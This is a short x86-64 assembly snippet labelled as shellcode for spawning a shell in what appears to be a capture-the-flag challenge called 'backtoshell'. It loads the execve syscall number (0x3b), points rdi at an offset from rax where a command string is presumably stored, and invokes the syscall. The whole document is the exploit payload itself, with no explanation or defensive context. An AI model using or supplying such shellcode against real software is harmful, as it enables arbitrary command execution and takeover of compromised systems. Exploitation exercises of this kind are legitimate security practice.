mov rdi, rax
add rdi, 0xf
xor rax, rax
mov al, 0x3b
syscall
ret
nop

shellcode for spawning shell of backtoshell